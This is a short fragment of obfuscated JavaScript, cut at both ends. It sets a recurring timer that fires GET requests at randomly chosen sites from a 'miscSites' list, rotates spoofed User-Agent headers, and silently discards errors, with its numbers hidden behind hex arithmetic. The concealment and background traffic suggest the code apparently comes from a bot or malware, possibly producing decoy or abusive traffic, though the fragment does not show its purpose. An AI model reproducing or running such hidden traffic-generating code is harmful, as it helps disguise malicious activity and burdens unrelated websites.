  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x55e + 0x8fb * 0x6 + -0x1fe8 * 0x1) * getRandomInt(0xcdb + -0xd06 + 0x2c, -0x1 * -0x212c + -0x22a5 + 0x17e * 0x1));
}, -0x85d * -0x1 + 0x2 * 0x6d1 + 0x1 * -0x159b);